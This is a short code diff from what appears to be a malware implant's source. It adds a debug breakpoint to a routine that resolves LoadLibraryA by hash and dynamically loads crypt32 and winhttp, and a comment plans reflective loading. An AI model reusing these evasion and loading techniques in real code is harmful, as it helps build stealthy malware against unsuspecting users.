@@ -55,6 +55,7 @@ namespace Implant {
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
+            __debugbreak();
             if (
                 !(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                 !(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
